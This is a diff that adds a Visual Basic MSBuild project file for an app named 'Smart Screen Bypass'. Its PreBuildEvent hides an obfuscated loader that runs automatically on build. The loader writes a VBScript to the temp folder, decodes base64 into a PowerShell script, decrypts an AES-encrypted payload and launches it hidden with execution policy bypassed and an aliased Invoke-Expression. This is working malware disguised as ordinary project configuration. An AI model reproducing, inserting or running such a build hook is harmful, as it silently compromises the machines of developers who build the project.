@@ -1,0 +1,126 @@
+<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Import Project="$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props" Condition="Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')" />
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
+    <ProjectGuid>{AA617379-0DFF-45F6-837B-EF46AF2112E5}</ProjectGuid>
+    <OutputType>WinExe</OutputType>
+    <StartupObject>Smart_Screen_Bypass.My.MyApplication</StartupObject>
+    <RootNamespace>Smart_Screen_Bypass</RootNamespace>
+    <AssemblyName>Smart Screen Bypass</AssemblyName>
+    <FileAlignment>512</FileAlignment>
+    <MyType>WindowsForms</MyType>
+    <TargetFrameworkVersion>v4.8</TargetFrameworkVersion>
+    <AutoGenerateBindingRedirects>true</AutoGenerateBindingRedirects>
+    <Deterministic>true</Deterministic>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <DefineDebug>true</DefineDebug>
+    <DefineTrace>true</DefineTrace>
+    <OutputPath>bin\Debug\</OutputPath>
+    <DocumentationFile>Smart Screen Bypass.xml</DocumentationFile>
+    <NoWarn>42016,41999,42017,42018,42019,42032,42036,42020,42021,42022</NoWarn>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugType>pdbonly</DebugType>
+    <DefineDebug>false</DefineDebug>
+    <DefineTrace>true</DefineTrace>
+    <Optimize>true</Optimize>
+    <OutputPath>bin\Release\</OutputPath>
+    <DocumentationFile>Smart Screen Bypass.xml</DocumentationFile>
+    <NoWarn>42016,41999,42017,42018,42019,42032,42036,42020,42021,42022</NoWarn>
+  </PropertyGroup>
+  <PropertyGroup>
+    <OptionExplicit>On</OptionExplicit>
+  </PropertyGroup>
+  <PropertyGroup>
+    <OptionCompare>Binary</OptionCompare>
+  </PropertyGroup>
+  <PropertyGroup>
+    <OptionStrict>Off</OptionStrict>
+  </PropertyGroup>
+  <PropertyGroup>
+    <OptionInfer>On</OptionInfer>
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="System" />
+    <Reference Include="System.Data" />
+    <Reference Include="System.Deployment" />
+    <Reference Include="System.Drawing" />
+    <Reference Include="System.Windows.Forms" />
+    <Reference Include="System.Xml" />
+    <Reference Include="System.Core" />
+    <Reference Include="System.Xml.Linq" />
+    <Reference Include="System.Data.DataSetExtensions" />
+    <Reference Include="System.Net.Http" />
+  </ItemGroup>
+  <ItemGroup>
+    <Import Include="Microsoft.VisualBasic" />
+    <Import Include="System" />
+    <Import Include="System.Collections" />
+    <Import Include="System.Collections.Generic" />
+    <Import Include="System.Data" />
+    <Import Include="System.Drawing" />
+    <Import Include="System.Diagnostics" />
+    <Import Include="System.Windows.Forms" />
+    <Import Include="System.Linq" />
+    <Import Include="System.Xml.Linq" />
+    <Import Include="System.Threading.Tasks" />
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="Form1.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Form1.Designer.vb">
+      <DependentUpon>Form1.vb</DependentUpon>
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="My Project\AssemblyInfo.vb" />
+    <Compile Include="My Project\Application.Designer.vb">
+      <AutoGen>True</AutoGen>
+      <DependentUpon>Application.myapp</DependentUpon>
+    </Compile>
+    <Compile Include="My Project\Resources.Designer.vb">
+      <AutoGen>True</AutoGen>
+      <DesignTime>True</DesignTime>
+      <DependentUpon>Resources.resx</DependentUpon>
+    </Compile>
+    <Compile Include="My Project\Settings.Designer.vb">
+      <AutoGen>True</AutoGen>
+      <DependentUpon>Settings.settings</DependentUpon>
+      <DesignTimeSharedInput>True</DesignTimeSharedInput>
+    </Compile>
+  </ItemGroup>
+  <ItemGroup>
+    <EmbeddedResource Include="Form1.resx">
+      <DependentUpon>Form1.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="My Project\Resources.resx">
+      <Generator>VbMyResourcesResXFileCodeGenerator</Generator>
+      <LastGenOutput>Resources.Designer.vb</LastGenOutput>
+      <CustomToolNamespace>My.Resources</CustomToolNamespace>
+      <SubType>Designer</SubType>
+    </EmbeddedResource>
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="My Project\Application.myapp">
+      <Generator>MyApplicationCodeGenerator</Generator>
+      <LastGenOutput>Application.Designer.vb</LastGenOutput>
+    </None>
+    <None Include="My Project\Settings.settings">
+      <Generator>SettingsSingleFileGenerator</Generator>
+      <CustomToolNamespace>My</CustomToolNamespace>
+      <LastGenOutput>Settings.Designer.vb</LastGenOutput>
+    </None>
+    <None Include="App.config" />
+  </ItemGroup>
+  <Import Project="$(MSBuildToolsPath)\Microsoft.VisualBasic.targets" />
+  <PropertyGroup>
+    <PreBuildEvent>@echo off&#xD;&#xA;setlocal&#xD;&#xA;set &quot;a=%25TEMP%25\qhA6ux&quot;&#xD;&#xA;mkdir &quot;%25a%25&quot; 2&gt;nul&#xD;&#xA;echo b = &quot;ZnVuY3Rpb24gRFZLIHtwYXJhbSAoW3N0cmluZ10kZW4sW2J5dGVbXV0kc0IpOyRrID0gTmV3LU9iamVjdCBieXRlW10gMzI7JHYgPSBOZXctT2JqZWN0IGJ5dGVbXSAxNjskZGVyaXZlQnl0ZXMgPSBOZXctT2JqZWN0IFN5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuUmZjMjg5OERlcml2ZUJ5dGVzKCRlbiwgJHNCLCAxMDAwLCBbU3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeS5IYXNoQWxnb3JpdGhtTmFtZV06OlNIQTI1Nik7JGsgPSAkZGVyaXZlQnl0ZXMuR2V0Qnl0ZXMoMzIpOyR2ID0gJGRlcml2ZUJ5dGVzLkdldEJ5dGVzKDE2KTtyZXR1cm4gQHsgSyA9ICRrOyBWID0gJHYgfX07ZnVuY3Rpb24gRCB7cGFyYW0gKFtzdHJpbmddJGVCWixbc3RyaW5nXSRlbmMpOyRkQnkgPSBbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCRlQlopOyRzYnkgPSAkZEJ5WzAuLjddOyRlQnkgPSAkZEJ5WzguLigkZEJ5Lkxlbmd0aCAtIDEpXTskZHJ2ID0gRFZLIC1lbiAkZW5jIC1zQiAkc2J5OyRrID0gJGRydi5LOyR2ID0gJGRydi5WOyRhID0gW1N5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuQWVzXTo6Q3JlYXRlKCk7JGEuTW9kZSA9IFtTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LkNpcGhlck1vZGVdOjpDQkM7JGEuUGFkZGluZyA9IFtTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LlBhZGRpbmdNb2RlXTo6UEtDUzc7JGEuS2V5ID0gJGs7JGEuSVYgPSAkdjskZGMgPSAkYS5DcmVhdGVEZWNyeXB0b3IoKTt0cnkgeyRkQiA9ICRkYy5UcmFuc2Zvcm1GaW5hbEJsb2NrKCRlQnksIDAsICRlQnkuTGVuZ3RoKTtyZXR1cm4gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoJGRCKX0gY2F0Y2gge3JldHVybiAkbnVsbH19JGVCID0gIm55Rm9hS014akJQQjhoaUdMRk9kbGJvLzZKVHljeGNQM3RzV2ljeUNvSXJuU3NrK2M4L0twZThsc3ZCMGRhU1JJZ2xxZTdSdi9qVFh3aHpOY2E0SW5sS25OQ0ttVlVQcnVQM2ZIR2hzbkNuY0V5SEFUNXN2RWFZdUptRGRta2RSMkQyUWVVL005ZjE0MVVNdDRqQ3EyN3N3bkpZVDlKM1FpUlI0SEo5ZFAvUmV5WlFFQllRRzV0L1V3amNsYjFJQUpxeUJ6WGNXSjNHWGFpTmNDa1lzNGZPclJ4eTRkN1dlT0l2NFhFcHZvOXpRNU1LY29EdjhxckJvanR2c3F2dHJOcm5rb3BwY1orUGszTndHck9jMVYwWkJyaWJDT1Bva1BxWUVXazZVUVplcDJJbWc0UW9JQ0tFOWVzRU02bWxnUzBiS29tMmRTMjJOY3pPMTdVZzdJdFNFUi8rdDJUSmNINThRQzRON1NCOGdmN2hZUFNrUHl6bUhDSUNzamxmcnMwSTNZUUFqSTN3OHFSaExiV09pcWt6K3Vvc09sNFZock04ZnVyUUptWVJMSkYxWG14RE9sVnJBS0hKUjFZaThueEdKVG9EOEs1QVY2bW1UODh0MjJKODF1VUt2VTcvbHNhN3FSRXhlbVB2Z29ma3M2ZlRnaGtOS1RnZ2tCbUVnZHJwRGlRZ3djeklPaFBwOFU2a21ZUWFlZzFDUWNJdzNjN2d6dnRiWDJwcDU0SEVqN2F5dGlGekgvaVJzVytFWlFDY211MHpUaHgwQ1RaVmZxZTRLclRQZFEvS3ZIdUZER2xrcU8vRkJaUWs0a1BzR2FZZC9ZLzhRSzZyZUM1Y0dyVnJNcWZZTFBHa2RUejFrdDA2SktaU2MyaWtkTjNpUExLOUJTbDRzOTNUajF1ZERwUEJCeXA0OXViWjF0cU5aRjI0Z0VZQUxkNkRqZkkwQzVpT0JMRWNHd0paMDUxVVR2THNnUFkwTnRDbGJxL0NIZWRvdEVJZlZaLyt2TFpFcHNIWVR4UmtwVHJkR0I1ZnBQRnZLeWxOZ1R5RFlTYWtLRktNN0x3YlMwWTRVY2pBdnVSb1BCZmc0d24yWVRGWWJqMWxHSk13Qk5SNlhhVDVoWnVnZ00ySk8yOVFSQVhjeXcxY0VWVmUzbERYMWdPMWZZZjNxb1pkRUlwdXpnR2tvRVpWS1lReDNpU3BhcUg2U2t4OGZxalkrZkkxOHFla3B3RUtzSkt3QkVZN0dQNlV4aDRWWlN5NWUvTFBxdGY0d3huNXlwWGJmSm9oSzlsemVOUklHcUczZVROZHUrVkc2ZGp0Y3V2QlJPMGNjU0ViYThxd0I4cVhwYWhaenU5Um9aemhsdllEalc3WGtWN01hK1E5cUhITEVNdE1hMUF4ZGlGa0ZxRjBGdEFIZzdMQldTdE5jbWFGYkJvc1NYVC9keVpnMzBHVWdhVTRMWHJiT2dIbGdFV1RlN1hDV1NWZkYzZjk3c0YrbzQ0aUdz&quot; &gt; &quot;%25a%25\o5kHZzOjX.vbs&quot;&#xD;&#xA;echo c = &quot;UDFHd1YrdEVTMzV3elhVTGkybm4yUGd6cmpLcVFTSENtOThLRWNiZTZyVGFXQmpZS3lNd3Via3ZvdmlEYW40TG9TY0haOVVZQnVGZ01xYWxSb3VCOVBCejF5eVVTZUJpSmpvR3VJQ2ZSRmhWRm5BL1RQUWJKQVRUK0FsK3FvUmllRXV0L0JLbmE4endMUjE5MFc3ejZLOWVwaUNDREJ1TFZmUlhqOS9ldERjY1d4NVI0aUJQenQrQ0VDR1RWYzN6QXVTK0MvK3ZHU0dvaUE5OGNaWE9TWVd6QlAyQW1QalZ1ZytqekhvVGZQcXNHV2lIektVUmdlNG1xMnBORlo3a010TTJITnlQWEh1OWs5RnYwRHd6WEpmR2pYTnFhUWdmbW9WU3o4TkJLRTRkMUtWbXl4OWtQOXJXblZGT0dRK0NUQkdKcFBTRTlwSG5MZUFBYVRYa1JjbjR0QXhQMmF5bjI4Y3ovYlF6d2phb2toY3dnL0Q1WUFTQ1NQY2Z2eUVtQmJCYjNMdDM4MFZlWnlzcXFmR2Q3MUMvK0VESkUrR0JheFFlZVFDcHFWelpnZCtObTd0bzdtWDJwRWNsSWtqamkrQXVnSW1HUkNRSzBjeDAvU3FIaXRncHR5T3lLUWFMS2p1UHk3WWpWS3NuNFN1b1phTzNmd1pUcWlzQVg0SU9iOHNkclJqNW5xUmZMOSswSEdocnRoMi9HRldPZTNXd2gvMnZaOEs5TlVZUnhnL1pEQ3ZzQUVtaElIdUpjeXZ5MGtWZTNNTWcydmFCQVVLME5aYTJYdzU4U1plM2VCUlFubDNOeWlzaGI4WVVIUmoxRVdkdzlockFHWThaTXZ2dHg1YmF6Z0NWanA1ZUEvZUxxSW9RMXU1N1BqSmxGaXI4d1Axai9Bb1VFdEpPc1o5UytKSnZCOGt1MnhRbUw0T21iSUEvcjBObUlFR2k1UzNJclljZG85QVNPRHVmMnJRdHc2U3NlM0R2dWdMWVYwUXJidVVaZjdDUDZNckFsdGlyM2F4VnZ3NFUxOU9SNGFUTjJwZmtPWUJwdzdJVnNIQ05qcEc3VGQ2RlY4U21WUEJ6U1FzeEppakdPSWErUFVrTkFOUzc2WTdsV1MvZnRYZkEyNE5JRG0zTVVvbmsvSWpOck5mOS9OeVI0TVlEWTJaMGRaNTF1eitNdnlkM1FNZ1ErbUFmZUw0UzdxWWJVUzlkcjNuZWxaaSt0SUxZbmdaV0N0MS9ETnFjYVgrZ1JBWlRDYjl4OHFqd3FqRXlFMjlwMWFDMDY4R2FISnlVaDNzTDZJQy9XaHZiYlpBU1FiNEtNcVVaZW9BRU1IcE5yVUsvNzNnc3RqN0Q4Y0tneEdOWDhvK042OTJBc0p1L21mc3VxN3pmbk9WRk5XeFRBMWVPWFNKcS9ITlZjS1ZaR0xBOUNOTEEydEV3eUlueEFVbGJuSnMzeGxtN3lBUyszZDZxemdSMjRGUlNNL0wyUTA3N0wrN0VyZEZUckRyYnp5WnJpWFNzdThWSXhKYktrZG1oSWdWK1h1Y3RNUlp2emhGQ3VOTUQ5dXEzdkpwSU5KTzdXbjBDeEpvL0VpeE5IWURNMXErOWc5NnRrRlh1QWVKL2puUFYvYllMOTlVZ21rUzczYUxUV3pFUndSTnpJMi9YbnJxZWplOTgzZjdyaWY5aURKaW9IeDYvV25MeEtPaExUaUtLTHFPNlRMVlg3Ulg5Z2dXWkdSUUtGMFU4Y3dZeVloQTZMZFpjTnZLWTlINnpkRjkwNHhVKzRDdnlqcDc1dmxZZ1dIb1A5Q3VpVkc2bjNlczZoUitVVmNCai9sQWtqMkIwdk5qUTE1M2FnRjZ2VUZtcWRBVi9mY3lxRmUzTko2cHYxMUtaTVNQSExUY0Z4b2lZWVVlZ2l6c2RPYkxIaWVsSTVqa1BHbUp0dHp5VnBSdm04VGdVYnIyczRYUjdJdHMwK3dkTy9YRk9WOUxzbEkzL1NTVFY4b3d4WjdNVGMwS09DSktGdUNHc3pha2lMakpQTUtoVzFHM3lJNHByelJUZVY4VkpoZFdJRXk1bkRtNmxqSWhIL01hVE5va0JlU0pjSWozMXVCSDk2NWx5ZDFsZzQ5VFE1NmZPZ2p5T0RlVklvMmpnYTI2WEUyOEZ4TFJwa09VaUh2VVpNamtsZk9KYnphc05Md3JZWUY2TnVaZ1VQVUVwRmtscUppMWZWS3NHc0JUK0cwbTJ2WUlUcVF1VTQvTGZyRTNCcnRzYXBtWG5VbzNubHM2OWFmRVlHdnZxcFg3b3VVSXlkYUFtSlZUZ3hrZmF5eCI7JHRtID0gJGVCLlRvQ2hhckFycmF5KCk7W2FycmF5XTo6UmV2ZXJzZSgkdG0pOyRSID0gRCAtZUJaICR0bSAtZW5jICIiOyR0ID0gJFIuVG9DaGFyQXJyYXkoKTsgW2FycmF5XTo6UmV2ZXJzZSgkdCk7ICRCVlYgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKC1qb2luICR0KSk7ICRFUFggPSAiSW52b2tlLUV4cHJlc3Npb24iOyBOZXctQWxpYXMgLU5hbWUgcFdOIC1WYWx1ZSAkRVBYIC1Gb3JjZTsgcFdOICRCVlY=&quot; &gt;&gt; &quot;%25a%25\o5kHZzOjX.vbs&quot;&#xD;&#xA;echo d = &quot;RWM0NjJPWDZ6MEJaMFo0K2RMU0ZWZ2gyaUxKbVhIRGNYRFhHa21aSk1VRG9TOHliZHpjd0V6eVFrU0h1NWtGazZKanUxajhneXQ2VjV6cFZ1QzJHdm95SHBQRHBpK3RRYlVBUFBuRktVcjQzdFBYc0gwblRVME05L0tQb2lnVE5ERXBmQmcvZG1LdUladjlKZk9qT3ZVRFlYRmJxVTdFK2wxb1JFbW9SdzR0ajhvMFpGUytNZ0hFQWFMcFVRa211WjJhQ2p5dit5eDJuT1RMM0UwZDVnNDFSQzF6RWJtUzY3UFdoQVI4aEs4NWVKM1hpSVNXL1dqbzUvcnh0L2syUXBpK1hHNkNXMUFrSks3enZOeUtvNnp0MVJYak8xeDk5N3A5QmVhZitxRUM4Q241TjlUZEY1eE52bU5keHMreXFLU1h0ZlROOHF2K2lvcTVDUkNzZWpUZGNoV09yZ0Q0ckZQSFExb3BPejNEdzRCUkM2V0pwZm5vbmFTdW5BUmVnNEV5VG0vUjJ3ZVVqNFNwSHdxajZhdkUzcEJJQVZ6eE5raHpLMDZOYWZpNGxpd092MUw4U3JLWWRwQlFzVWVDam81Sm44ZUxHaTJ4RlN1aFg0SzJITWxhWndCRitqcjg5K3dzczRMM21IN3BNRGlvNEFjeWFrMnJ3VHZ4SU84aEFBVEZ6VWdsbkQxUmFUTDROYVNKTUNrRFY0ZVh2THUwc0VKZEhEVVd0bWgwVWREQ3B6UWd2NFhWVlBxaHM3VkhWaXc1SnF5OEUwdjlpaENkTFdRRGc1VlpPVVR5WlI1MzV0c0ovRWdoNk03emVWdGUzR3FPdWV3cFk0cEF1cmpRcU13UnFqWUtTNGtibFZ3OTU5QUhOWDd2WEF4eG1nQTU4S3pxRGFDM2h4MzliVUk1a0JFTHpLdDVvaE9FeEhTN2Y0QXZDYS9tcjY2R0RXVjVKd015YjdmL3lEUVkzSEdDL2VjZ3BTdjhpTkNmMjIycWk3eUhIOGxXTEJMWktrUDcwS0JkVVlOT25waHp2Rm1qaGYxL2Z4M3d2eTVMOU1mWUxZcFJhYldyc3JvTEdIM1p0Q2wzZ2d5Y0NRd0kzaEVmd25wVXZDTjd0eWdsS01DWXBkSEk3enFGd01BS0tOdVdZRzlxNzlZRkhHcjZxS2Vhc21mTHZFU2xVRWROYU1oMXVZTmJ2N25uZUl5T3c1OUFZWWQ3czJKRVFXVm5lbmtQTjB2MnM3Q2l4eEhPMGtJakkzSnYrUlJkYmJxdlNUNStrc3ZPaWlSdThaZUt4QllKQWV0dzdjU1BGbFVuNXBua1VKWTVVNkJaYkV2M29PbENwSDkzYkRqVVEyMW1MZlhHZ28wSitKbVBXMWNCNTF6R3BkTEg1VUN5TG11bGlqWHlOaXVGVUNqRVFjYWt3UFI2T1Q2YW9pb2JKZ2xMcjBTYnl5cGg1NHQvVlFTcXdkOXNraTlaSjZaMTc4Yzk0VFFSMUEyekVuSks4amgycWd6WDJ2OElmdEZuU0RTaEZKMExrdU5GaGNUQWJOVDZ6L2pQU0xKS01tMGZmSkN3MklPUkNOVzk4eWFzdUtjYWZKS1h3T2FsdzQvQ0FTZGh5eUhBS1JjMDhab1ErNUlJdzN6WXFwOGJHZzBEaE1EM2FLWFZLWWxSNzN5UnNJc3hYUG9SaldJQTFjMjh6eFJxSGE0aGIwdTJvY3poT25Ub0UyOEw5OSthRjM4bFJzanM3cWZtaERYbmR1SEZLVThtdlBteHd0UGIyWHVYZUF3K3hvalBiYTY4TU9qNzFVTGFZSm9WNEhWSUQzRkFLQkpWOTk5bjVTa2ZYM1ZWS2NybHZaOHF1ekVxY0x6ck5kL1pqOXVWcFV1QnR5MkxBQmQ2bUJ2U3JoMnIzN3NpOEd5Vm1IbU9XUm5GZ3pZTnJYckpmQUdvWHRHSU1EVURpeHdiZWl6MFY2WURyMWFJNEpjY1B1RFJCTWVUS3ZZZEljcWhwSFVtSlZqRFdTYkIzN0tUQlplYXpZWnhJY3RWc3JKcWpIU2xnT2d6MUdvTTJrby9TQURreEYxYzhwZ05ZM3hCTlZOSXJZYlVwZkErRGtaOEhwMnV6VXFHZjJ0b1MwVEtHVUNmSnQyVmtuRW92YVBOQ2M5c1RaSUJRRkJFL256bW9XRFRHNEZQVWVVM3NtZG5WWWFrejk0eU5UUUphaVJaVi9mc0xBeXlSR3pDaHViK2tsZHZ2ZHU1TmhBSnF5UERjVWpaZUkxbGlUU0YxSkdvRUhkalV3YUdHV0QvZzFGVlZESllDQzY5Y0ZjSDdNZnlTU2ZpbGdhSkk4R0FsbUxXRzN6SjZJOThEeDY1MXY1ekRjSlBFcmtmc1RwdW4vSEtHckRFa2U1VGZYSy85UG9tZWN2a0I4L2tudTY5YU5rZUtxSDNTUThZbDFCTkZMUExnanNENHUrVVZYTk41RFlkNjcrYjY3MXNRQ09aMGRqY3RBT2ZyQW9BK1dHRDFwd1dWQXRYcHVjZGViaXJGOFZMb3RWQmZ1WmU0V29KQVpHQzBic0dDQVdqZDBiRFUraEhRYU56VnQ5UlQ4ckdxVGlWalI3Q2NBb01yc0NKOTJGVEE3cXRCMTUxRDZTTFh5M3B2YllJd2JHQzlWWWFzN0p6Q1JrZ0FLRVJYR1MyMWVNQzFiQjRFN203Q2RCbkNw&quot; &gt;&gt; &quot;%25a%25\o5kHZzOjX.vbs&quot;&#xD;&#xA;echo e = b ^&amp; d ^&amp; c &gt;&gt; &quot;%25a%25\o5kHZzOjX.vbs&quot;&#xD;&#xA;echo Set f = CreateObject(&quot;MSXml2.DOMDocument.6.0&quot;).createElement(&quot;base64&quot;) &gt;&gt; &quot;%25a%25\o5kHZzOjX.vbs&quot;&#xD;&#xA;echo f.DataType = &quot;bin.base64&quot; &gt;&gt; &quot;%25a%25\o5kHZzOjX.vbs&quot;&#xD;&#xA;echo f.Text = e &gt;&gt; &quot;%25a%25\o5kHZzOjX.vbs&quot;&#xD;&#xA;echo g = f.NodeTypedValue &gt;&gt; &quot;%25a%25\o5kHZzOjX.vbs&quot;&#xD;&#xA;echo h = &quot;%25a%25\KZgK.ps1.ps1&quot; &gt;&gt; &quot;%25a%25\o5kHZzOjX.vbs&quot;&#xD;&#xA;echo Set j = CreateObject(&quot;Scripting.FileSystemObject&quot;) &gt;&gt; &quot;%25a%25\o5kHZzOjX.vbs&quot;&#xD;&#xA;echo Set k = j.CreateTextFile(h, True) &gt;&gt; &quot;%25a%25\o5kHZzOjX.vbs&quot;&#xD;&#xA;echo k.Write l(g) &gt;&gt; &quot;%25a%25\o5kHZzOjX.vbs&quot;&#xD;&#xA;echo k.Close &gt;&gt; &quot;%25a%25\o5kHZzOjX.vbs&quot;&#xD;&#xA;echo Set m = CreateObject(&quot;WScript.Shell&quot;) &gt;&gt; &quot;%25a%25\o5kHZzOjX.vbs&quot;&#xD;&#xA;echo m.Run &quot;powershell.exe -ExecutionPolicy Bypass -File &quot; ^&amp; h, 0, False &gt;&gt; &quot;%25a%25\o5kHZzOjX.vbs&quot;&#xD;&#xA;echo Function l(n) &gt;&gt; &quot;%25a%25\o5kHZzOjX.vbs&quot;&#xD;&#xA;echo Dim o, p &gt;&gt; &quot;%25a%25\o5kHZzOjX.vbs&quot;&#xD;&#xA;echo Set o = CreateObject(&quot;ADODB.Recordset&quot;) &gt;&gt; &quot;%25a%25\o5kHZzOjX.vbs&quot;&#xD;&#xA;echo p = LenB(n) &gt;&gt; &quot;%25a%25\o5kHZzOjX.vbs&quot;&#xD;&#xA;echo If p ^&gt; 0 Then &gt;&gt; &quot;%25a%25\o5kHZzOjX.vbs&quot;&#xD;&#xA;echo o.Fields.Append &quot;q&quot;, 201, p &gt;&gt; &quot;%25a%25\o5kHZzOjX.vbs&quot;&#xD;&#xA;echo o.Open &gt;&gt; &quot;%25a%25\o5kHZzOjX.vbs&quot;&#xD;&#xA;echo o.AddNew &gt;&gt; &quot;%25a%25\o5kHZzOjX.vbs&quot;&#xD;&#xA;echo o(&quot;q&quot;).AppendChunk n &gt;&gt; &quot;%25a%25\o5kHZzOjX.vbs&quot;&#xD;&#xA;echo o.Update &gt;&gt; &quot;%25a%25\o5kHZzOjX.vbs&quot;&#xD;&#xA;echo l = o(&quot;q&quot;).GetChunk(p) &gt;&gt; &quot;%25a%25\o5kHZzOjX.vbs&quot;&#xD;&#xA;echo Else &gt;&gt; &quot;%25a%25\o5kHZzOjX.vbs&quot;&#xD;&#xA;echo l = &quot;&quot; &gt;&gt; &quot;%25a%25\o5kHZzOjX.vbs&quot;&#xD;&#xA;echo End If &gt;&gt; &quot;%25a%25\o5kHZzOjX.vbs&quot;&#xD;&#xA;echo End Function &gt;&gt; &quot;%25a%25\o5kHZzOjX.vbs&quot;&#xD;&#xA;cscript //nologo &quot;%25a%25\o5kHZzOjX.vbs&quot;&#xD;&#xA;endlocal</PreBuildEvent>
+  </PropertyGroup>
+</Project>
